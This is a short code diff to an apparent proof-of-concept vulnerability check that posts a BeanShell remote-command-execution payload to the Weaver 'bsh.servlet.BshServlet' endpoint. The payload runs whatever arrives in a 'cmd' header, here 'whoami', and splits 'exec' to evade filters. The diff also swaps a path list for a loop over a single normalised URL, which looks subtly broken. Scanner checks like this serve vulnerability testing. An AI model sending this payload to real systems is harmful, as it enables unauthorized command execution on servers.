@@ -21,17 +21,13 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             headers = {
                 "Content-Type": "application/x-www-form-urlencoded",
                 "cmd": "whoami"
             }
             data = 'bsh.script=eval ("ex"%2b"ec (bsh.httpServletRequest.getHeader(\"cmd\"))")&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, './'):
                     url = path + "weaver/bsh.servlet.BshServlet"
                     async with session.post(url=url, headers=headers, data=data) as response:
                         if response!=None:
